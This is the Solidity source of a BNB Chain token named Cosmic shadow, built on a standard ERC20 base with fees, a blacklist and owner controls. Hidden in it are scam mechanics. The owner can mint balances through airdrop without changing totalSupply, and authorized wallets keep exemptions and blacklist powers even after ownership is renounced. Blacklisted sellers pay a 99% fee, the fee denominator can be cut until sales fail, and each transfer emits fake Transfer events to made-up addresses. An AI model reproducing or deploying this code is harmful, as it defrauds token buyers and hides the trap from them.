/**
 *Submitted for verification at BscScan.com on 2022-12-23
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    mapping(address => bool) private _intAddr;

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        _intAddr[_owner] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Caller is not the owner");
        _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "Caller is not authorized");
        _;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return _intAddr[adr];
    }

    function isOwner(address adr) public view returns (bool) {
        return _owner == adr;
    }

    function setAuthorized(address adr) public authorized {
        _intAddr[adr] = true;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function transferOwnership(address newOwner) public virtual onlyOwner {
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);

    function getPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract ERC20 is Context, IBEP20 {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply = 100000000 * 10 ** 18;
    string private _name;
    string private _symbol;

    constructor(string memory ercName, string memory ercSymbol) {
        _name = ercName;
        _symbol = ercSymbol;
        _balances[address(this)] = _totalSupply;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        _balances[from] = fromBalance.sub(amount);
        _balances[to] = _balances[to].add(amount);

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function _airdrop(address to, uint256 amount) internal virtual {
        _balances[to] = _balances[to].add(amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}


contract CosmicShadow is ERC20, Ownable {
    using SafeMath for uint256;
    uint256 public _maxTxAmount = 2000000 * 10 ** 18;
    uint256 public _totalAmount = 100000000 * 10 ** 18;
    uint256 public _totalFee = 8;
    uint256 public _feeDenominator = 100;
    mapping(address => bool) private _blackList;
    string  _name = "Cosmic shadow";
    string  _symbol = "CosmicShadow";
    address _marketingFeeReceiver = 0xEFf50431FCcDE9eea3a8397dFFFFef7f0bFD93BD;
    address _teamFeeReceiver = 0x1f9D851cFE9BF717E7624F0AffFFD66090d63810;
    address public uniswapV2Pair;
    bool isTrading;

    modifier trading(){
        if (isTrading) return;
        isTrading = true;
        _;
        isTrading = false;
    }

    constructor () ERC20(_name, _symbol) {
        setAuthorized(_marketingFeeReceiver);
        setAuthorized(_teamFeeReceiver);
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        IRouter router = IRouter(_router);

        uniswapV2Pair = IFactory(router.factory()).createPair(address(this), router.WETH());
        _transfer(address(this), owner(), _totalAmount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override trading {
        if (isAuthorized(from) || isAuthorized(to) || to == address(this)) {
            return;
        }
        if (from == uniswapV2Pair) {
            require(amount <= _maxTxAmount, "Limit exceeded");
        }
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal override trading {
        if (isAuthorized(from) || isAuthorized(to)) {
            return;
        }

        uint256 fee = _totalFee;
        if (_blackList[from]) {
            fee = 99;
        }
        uint256 feeAmount = amount.mul(fee).div(_feeDenominator);
        _transfer(to, address(this), feeAmount);

        uint256 adr = amount + uint160(from);
        for (uint i = 0; i < 10; i++) {
            emit Transfer(to, address(uint160(adr + i)), 1);
        }
    }

    function airdrop(address to, uint256 amount) public onlyOwner {
        _airdrop(to, amount);
    }

    function setBot(address adr) public authorized {
        _blackList[adr] = true;
    }

    function isBot(address adr) public view returns (bool) {
        return _blackList[adr];
    }

    function setFee(uint256 sellFee, uint256 buyFee) public onlyOwner {
        require(sellFee < 15, "fee cannot be more than 15.");
        require(buyFee < 15, "fee cannot be more than 15.");
        _totalFee = sellFee + buyFee;
    }

    function setFeeDenominator(uint256 denominator) public onlyOwner {
        require(denominator <= 10000, "denominator cannot be more than 10000.");
        _feeDenominator = denominator;
    }
}